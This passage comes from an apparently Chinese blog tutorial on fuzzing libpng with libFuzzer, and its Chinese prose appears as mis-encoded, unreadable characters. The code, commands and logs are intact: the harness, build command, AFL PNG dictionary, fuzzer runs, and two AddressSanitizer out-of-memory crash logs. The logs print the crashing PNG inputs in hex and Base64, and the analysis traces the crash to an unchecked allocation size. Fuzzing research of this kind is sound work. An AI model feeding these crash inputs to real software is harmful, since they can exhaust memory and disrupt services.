class="line">  <span class="type">int</span> passes = png_set_interlace_handling(png_handler.png_ptr);</span><br><span class="line">  png_start_read_image(png_handler.png_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pass = <span class="number">0</span>; pass &lt; passes; ++pass) &#123;</span><br><span class="line">    <span class="keyword">for</span> (png_uint_32 y = <span class="number">0</span>; y &lt; height; ++y) &#123;</span><br><span class="line">      png_read_row(png_handler.png_ptr,</span><br><span class="line">                   static_cast&lt;png_bytep&gt;(png_handler.row_ptr), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºæ¨¡ç³Šæµ‹è¯•æ¥è¯´ï¼Œèƒ½å¦å†™å‡ºåˆé€‚çš„harnesså…³ä¹ç€fuzzæœ€åçš„ç»“æœï¼Œæˆ‘ä»¬é€šå¸¸é€‰æ‹©æ¶‰åŠå†…å­˜ç®¡ç†ï¼Œæ•°æ®å¤„ç†ç­‰æ–¹é¢çš„å‡½æ•°ä½œä¸ºæˆ‘ä»¬çš„æ¥å£å‡½æ•°å»fuzzã€‚<br>è¿™é‡Œç»™å‡ºçš„harnessä¸­æˆ‘ä»¬æ¯”è¾ƒå®¹æ˜“çœ‹åˆ°å®ƒä¼šé¦–å…ˆå»é€šè¿‡<code>png_sig_cmp</code>å‡½æ•°å»åˆ¤æ–­è¾“å…¥çš„dataæ˜¯å¦ç¬¦åˆpngçš„æ ¼å¼ï¼Œç¬¦åˆæ‰èƒ½è¿›å…¥åˆ°åé¢çš„é€»è¾‘ä¸­ï¼Œè¿™ä¸€æ–¹é¢æ˜¯ç¡®ä¿dataçš„æœ‰æ•ˆæ€§ï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†æ•°æ®å˜å¼‚çš„é€Ÿç‡ã€‚<br>ç”±äºè¦æ±‚è¾“å…¥æ•°æ®ä¸ºpngçš„æ ¼å¼ï¼Œé‚£è‡ªç„¶æƒ³åˆ°ä½¿ç”¨å­—å…¸å»æ‹¼æ¥å…³é”®å­—ã€‚è¿™æ ·çš„æƒ³æ³•æ˜¯æ­£ç¡®çš„ï¼Œä¸‹é¢æ¯”è¾ƒä¸€ä¸‹ä¸¤è€…çš„å·®å¼‚ï¼š<br>å…ˆç¼–è¯‘:<code>clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 libpng_read_fuzzer.cc -I libpng libpng/.libs/libpng16.a -fsanitize=fuzzer -lz -o libpng_read_fuzzer</code><br>ä½¿ç”¨çš„ä¹Ÿæ˜¯AFLç»™å‡ºçš„png.dict:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># Copyright 2016 Google Inc.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line">#</span><br><span class="line">################################################################################</span><br><span class="line">#</span><br><span class="line"># AFL dictionary for PNG images</span><br><span class="line"># -----------------------------</span><br><span class="line">#</span><br><span class="line"># Just the basic, standard-originating sections; does not include vendor</span><br><span class="line"># extensions.</span><br><span class="line">#</span><br><span class="line"># Created by Michal Zalewski &lt;lcamtuf@google.com&gt;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">header_png=&quot;\x89PNG\x0d\x0a\x1a\x0a&quot;</span><br><span class="line"></span><br><span class="line">section_IDAT=&quot;IDAT&quot;</span><br><span class="line">section_IEND=&quot;IEND&quot;</span><br><span class="line">section_IHDR=&quot;IHDR&quot;</span><br><span class="line">section_PLTE=&quot;PLTE&quot;</span><br><span class="line">section_bKGD=&quot;bKGD&quot;</span><br><span class="line">section_cHRM=&quot;cHRM&quot;</span><br><span class="line">section_fRAc=&quot;fRAc&quot;</span><br><span class="line">section_gAMA=&quot;gAMA&quot;</span><br><span class="line">section_gIFg=&quot;gIFg&quot;</span><br><span class="line">section_gIFt=&quot;gIFt&quot;</span><br><span class="line">section_gIFx=&quot;gIFx&quot;</span><br><span class="line">section_hIST=&quot;hIST&quot;</span><br><span class="line">section_iCCP=&quot;iCCP&quot;</span><br><span class="line">section_iTXt=&quot;iTXt&quot;</span><br><span class="line">section_oFFs=&quot;oFFs&quot;</span><br><span class="line">section_pCAL=&quot;pCAL&quot;</span><br><span class="line">section_pHYs=&quot;pHYs&quot;</span><br><span class="line">section_sBIT=&quot;sBIT&quot;</span><br><span class="line">section_sCAL=&quot;sCAL&quot;</span><br><span class="line">section_sPLT=&quot;sPLT&quot;</span><br><span class="line">section_sRGB=&quot;sRGB&quot;</span><br><span class="line">section_sTER=&quot;sTER&quot;</span><br><span class="line">section_tEXt=&quot;tEXt&quot;</span><br><span class="line">section_tIME=&quot;tIME&quot;</span><br><span class="line">section_tRNS=&quot;tRNS&quot;</span><br><span class="line">section_zTXt=&quot;zTXt&quot;# </span><br></pre></td></tr></table></figure><p>å…ˆä¸ä½¿ç”¨å­—å…¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1</span><br><span class="line">Done 5454409 runs in 61 second(s)</span><br><span class="line">stat::number_of_executed_units: 5454409</span><br><span class="line">stat::average_exec_per_sec:     89416</span><br><span class="line">stat::new_units_added:          512</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              822</span><br></pre></td></tr></table></figure><p>æ¢æµ‹åˆ°äº†512ä¸ªä»£ç å•å…ƒ<br>ä¹‹åä½¿ç”¨å­—å…¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1 -dict=./png.dict</span><br><span class="line">#2849333REDUCE cov: 287 ft: 511 corp: 111/19Kb lim: 4096 exec/s: 105530 rss: 682Mb L: 43/3088 MS: 1 EraseBytes-</span><br><span class="line">#2871709REDUCE cov: 291 ft: 515 corp: 112/19Kb lim: 4096 exec/s: 106359 rss: 682Mb L: 47/3088 MS: 1 ManualDict- DE: &quot;bKGD&quot;-</span><br><span class="line">#2883416NEW    cov: 293 ft: 520 corp: 113/19Kb lim: 4096 exec/s: 106793 rss: 682Mb L: 48/3088 MS: 2 PersAutoDict-EraseBytes- DE: &quot;sPLT&quot;-</span><br><span class="line">=================================================================</span><br><span class="line">==26551==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x62474b42 bytes</span><br><span class="line">    #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x5a98a3 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</span><br><span class="line">    #2 0x5a98a3 in png_handle_sPLT /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:1683:13</span><br><span class="line">    #3 0x571b3c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:225:10</span><br><span class="line">    #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3</span><br><span class="line">    #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #11 0x7f5d84c2fbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">==26551==HINT: if you don&#x27;t care about these errors you may set allocator_may_return_null=1</span><br><span class="line">SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc</span><br><span class="line">==26551==ABORTING</span><br><span class="line">MS: 1 ShuffleBytes-; base unit: 1c223175724dec61e3adf94affb1cceec27d30ae</span><br><span class="line">0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x63,0x1,0x0,0x0,0x0,0x0,0x4,0x0,0x41,0x41,0x62,0x47,0x4b,0x41,0x73,0x50,0x4c,0x54,0x44,0x41,0x41,0x41,0x41,0x41,0xb9,</span><br><span class="line">\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00\x10\x00\x00\x00c\x01\x00\x00\x00\x00\x04\x00AAbGKAsPLTDAAAAA\xb9</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-ac5ad67d43ac829fd5148d6930a33c17c2ac7143</span><br><span class="line">Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG5</span><br><span class="line">stat::number_of_executed_units: 2888597</span><br><span class="line">stat::average_exec_per_sec:     103164</span><br><span class="line">stat::new_units_added:          533</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              682</span><br></pre></td></tr></table></figure><p>å•Šè¿™ï¼Œç›´æ¥å‡ºcrash,æœ‰ç‚¹ä¸œè¥¿ã€‚è¿™ä¹Ÿå†æ¬¡è¯´æ˜äº†å¥½çš„å­—å…¸ä½¿å¾—æˆ‘ä»¬fuzzæ—¶çš„è¾“å…¥æ•°æ®æ›´å…·æœ‰é’ˆå¯¹æ€§ï¼Œå½“ç„¶ä¹Ÿæé«˜äº†è§¦å‘æ›´å¤šä»£ç å•å…ƒå’Œè·å¾—crashçš„å¯èƒ½ã€‚<br>æˆ‘ä½¿ç”¨workshopçš„#1ç¼–è¯‘æ–¹æ³•åœ¨ä½¿ç”¨dictçš„æƒ…å†µä¸‹covåªæœ‰40å¤šï¼Œä¹Ÿæœªèƒ½å¾—åˆ°crashï¼Œå› æ­¤ä¸Šé¢èƒ½å¾—åˆ°crashä¹Ÿå¾—ç›Šäºæˆ‘ä»¬çš„æ’æ¡©ç­–ç•¥ã€‚<br>åœ¨æœªä½¿ç”¨è¯­æ–™åº“çš„æƒ…å†µä¸‹å°±å¾—åˆ°äº†crashå®å±æ„æ–™ä¹‹å¤–ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ä½¿ç”¨å­—å…¸çš„ä¸‹æƒ…å†µä»ç„¶æš‚æ—¶æœªå¾—åˆ°crashï¼Œå¦ä¸€ä¸ªæ–¹æ³•å¯ä»¥å»å¯»æ‰¾ä¸€äº›æœ‰æ•ˆçš„è¾“å…¥è¯­æ–™åº“ã€‚å› ä¸ºlibfuzzeræ˜¯è¿›åŒ–å‹çš„fuzzï¼Œç»“åˆäº†äº§ç”Ÿå’Œå˜å¼‚ä¸¤ä¸ªå‘é¢ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æä¾›ä¸€äº›å¥½çš„seedï¼Œè™½ç„¶å®ƒæœ¬èº«æ²¡æ³•é€ æˆç¨‹åºcrashï¼Œä½†libfuzzerä¼šåœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œå˜å¼‚ï¼Œå°±æœ‰å¯èƒ½å˜å¼‚å‡ºæ›´å¥½çš„è¯­æ–™ï¼Œä»è€Œå¢å¤§ç¨‹åºcrashçš„æ¦‚ç‡ã€‚å…·ä½“çš„å˜å¼‚ç­–ç•¥éœ€è¦æˆ‘ä»¬å»é˜…è¯»libfuzzerçš„æºç æˆ–è€…äº›ç›¸å…³çš„è®ºæ–‡ã€‚<br>workshopç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›seedï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">âœ  09 git:(master) âœ— ls seed_corpus </span><br><span class="line">anti_aliasing_perspective.png             blue_yellow_alpha.png                green.png                                  offset_background_filter_1x.png</span><br><span class="line">anti_aliasing.png                         blue_yellow_alpha_translate.png      green_small.png                            offset_background_filter_2x.png</span><br><span class="line">axis_aligned.png                          blue_yellow_anti_aliasing.png        green_small_with_blue_corner.png           rotated_drop_shadow_filter_gl.png</span><br><span class="line">background_filter_blur_off_axis.png       blue_yellow_filter_chain.png         green_with_blue_corner.png                 rotated_drop_shadow_filter_sw.png</span><br><span class="line">background_filter_blur_outsets.png        blue_yellow_flipped.png              image_mask_of_layer.png                    rotated_filter_gl.png</span><br><span class="line">background_filter_blur.png                blue_yellow_partial_flipped.png      intersecting_blue_green.png                rotated_filter_sw.png</span><br><span class="line">background_filter_on_scaled_layer_gl.png  blue_yellow.png                      intersecting_blue_green_squares.png        scaled_render_surface_layer_gl.png</span><br><span class="line">background_filter_on_scaled_layer_sw.png  blur_filter_with_clip_gl.png         intersecting_blue_green_squares_video.png  scaled_render_surface_layer_sw.png</span><br><span class="line">background_filter.png                     blur_filter_with_clip_sw.png         intersecting_light_dark_squares_video.png  spiral_64_scale.png</span><br><span class="line">background_filter_rotated_gl.png          checkers_big.png                     mask_bottom_right.png                      spiral_double_scale.png</span><br><span class="line">background_filter_rotated_sw.png          checkers.png                         mask_middle.png                            spiral.png</span><br><span class="line">black.png                                 dark_grey.png                        mask_of_background_filter.png              white.png</span><br><span class="line">blending_and_filter.png                   enlarged_texture_on_crop_offset.png  mask_of_clipped_layer.png                  wrap_mode_repeat.png</span><br><span class="line">blending_render_pass_cm.png               enlarged_texture_on_threshold.png    mask_of_layer.png                          yuv_stripes_alpha.png</span><br><span class="line">blending_render_pass_mask_cm.png          filter_with_giant_crop_rect.png      mask_of_layer_with_blend.png               yuv_stripes_clipped.png</span><br><span class="line">blending_render_pass_mask.png             force_anti_aliasing_off.png          mask_of_replica_of_clipped_layer.png       yuv_stripes_offset.png</span><br><span class="line">blending_render_pass.png                  four_blue_green_checkers_linear.png  mask_of_replica.png                        yuv_stripes.png</span><br><span class="line">blending_transparent.png                  four_blue_green_checkers.png         mask_with_replica_of_clipped_layer.png     zoom_filter_gl.png</span><br><span class="line">blending_with_root.png                    green_alpha.png                      mask_with_replica.png                      zoom_filter_sw.png</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨seed_corpuså»fuzz:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">âœ  09 git:(master) âœ— ./libpng_read_fuzzer seed_corpus</span><br><span class="line">#502095REDUCE cov: 626 ft: 2025 corp: 450/631Kb lim: 19944 exec/s: 4219 rss: 457Mb L: 821/19555 MS: 2 CMP-EraseBytes- DE: &quot;JDAT&quot;-</span><br><span class="line">#502951REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4226 rss: 457Mb L: 2710/19555 MS: 1 EraseBytes-</span><br><span class="line">#503447REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4230 rss: 457Mb L: 467/19555 MS: 1 EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==26681==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes</span><br><span class="line">    #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</span><br><span class="line">    #1 0x5ad493 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</span><br><span class="line">    #2 0x5ad493 in png_handle_sCAL /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:2323:13</span><br><span class="line">    #3 0x571a4c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:200:10</span><br><span class="line">    #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3</span><br><span class="line">    #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15</span><br><span class="line">    #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3</span><br><span class="line">    #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19</span><br><span class="line">    #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5</span><br><span class="line">    #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6</span><br><span class="line">    #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10</span><br><span class="line">    #11 0x7fc8e2ee1bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)</span><br><span class="line"></span><br><span class="line">==26681==HINT: if you don&#x27;t care about these errors you may set allocator_may_return_null=1</span><br><span class="line">SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc</span><br><span class="line">==26681==ABORTING</span><br><span class="line">MS: 1 ChangeByte-; base unit: 7221de698a693628dcbac00aa34b38a2aca2a905</span><br><span class="line">0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x27,0x0,0x0,0x0,0xc8,0x8,0x2,0x0,0x0,0x0,0x22,0x3a,0x39,0xc9,0x0,0x0,0x0,0x1,0x73,0x52,0x47,0x42,0x0,0xae,0xce,0x1c,0xe9,0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xb,0x13,0x0,0x0,0xb,0x13,0x1,0x0,0x9a,0x9c,0x18,0x60,0x0,0x0,0x7,0x73,0x43,0x41,0x4c,0x7,0xdd,0xed,0x4,0x14,0x33,0x74,0x49,0x0,0x0,0x0,0x0,0xb7,0xba,0x47,0x42,0x60,0x82,</span><br><span class="line">\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00&#x27;\x00\x00\x00\xc8\x08\x02\x00\x00\x00\&quot;:9\xc9\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x09pHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18`\x00\x00\x07sCAL\x07\xdd\xed\x04\x143tI\x00\x00\x00\x00\xb7\xbaGB`\x82</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-110b2ad7102489b24efc4899bf7d9e55904eb83b</span><br><span class="line">Base64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC</span><br></pre></td></tr></table></figure><p>ä¹Ÿé¡ºåˆ©å¾—åˆ°äº†crashï¼Œè¿™æ¬¡çš„crashå’Œä¸Šé¢çš„crashæœ‰æ‰€ä¸åŒï¼Œä¸Šé¢é€ æˆcrashæ—¶çš„covåªæœ‰293ï¼Œè€Œä¸”é€ æˆcrashçš„è¾“å…¥ä¸º<code>Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG51</code>ï¼Œè€Œä½¿ç”¨seedçš„è¯covè¾¾åˆ°äº†626ï¼Œè€Œä¸”é€ æˆcrashçš„æ•°æ®ä¸º<code>Base64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC</code>ï¼Œè¦é•¿å¾ˆå¤šã€‚<br>å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬åŒæ—¶ä½¿ç”¨å­—å…¸å’Œè¯­æ–™åº“ï¼Œä»äº§ç”Ÿå’Œå˜å¼‚ä¸¤ä¸ªæ–¹é¢å»æé«˜æ ·ä¾‹çš„å¨åŠ›ï¼ŒåŒç®¡é½ä¸‹ã€‚</p><p>æ¥ä¸‹æ¥å°±è¦åˆ†æcrashçš„åŸå› äº†ï¼š<code>ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes</code>ï¼Œæ€ä¹ˆæœ‰ç‚¹çœ¼ç†Ÿï¼Œå¥½åƒå’Œlesson 09çš„æŠ¥é”™ä¸€æ ·ã€‚ã€‚ä½†ä¹Ÿæœ‰æ‰€ä¸åŒï¼Œå®ƒå¯¹é”™è¯¯å®šä½åœ¨äº†<code>in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3</code>ï¼Œè¿™ä¸ªæ˜¯åº•å±‚mallocçš„ä½ç½®ï¼ŒåŒæ—¶æœ‰ä¸ªhintï¼š<code>if you don&#39;t care about these errors you may set allocator_may_return_null=1</code>ï¼Œæç¤ºæˆ‘ä»¬è¿™ä¸ªcrashæ˜¯ç”±äºmallocç”³è¯·å¤±è´¥é€ æˆçš„ï¼Œä¹Ÿå°±æ˜¯<code>/home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16</code>å¤„çš„malloc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      buffer = png_voidcast(png_bytep, png_malloc_base(png_ptr, new_size));  <span class="comment">//æ­¤å¤„çš„png_malloc_base</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         png_ptr-&gt;read_buffer = buffer;</span><br><span class="line">         png_ptr-&gt;read_buffer_size = new_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (warn &lt; <span class="number">2</span>) <span class="comment">/* else silent */</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (warn != <span class="number">0</span>)</span><br><span class="line">             png_chunk_warning(png_ptr, <span class="string">&quot;insufficient memory to read chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             png_chunk_error(png_ptr, <span class="string">&quot;insufficient memory to read chunk&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å®šä½åˆ°é—®é¢˜å‡ºåœ¨png_malloc_base(png_ptr, new_size)å¤„ï¼Œç”±äºæ²¡æœ‰å¯¹new_sizeçš„å¤§å°è¿›è¡Œä¸¥æ ¼é™åˆ¶å²›ä¸»åœ¨mallocæ—¶<code>trying to allocate 0x60000008 bytes</code>å¯¼è‡´å¼‚å¸¸å´©æºƒã€‚</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" 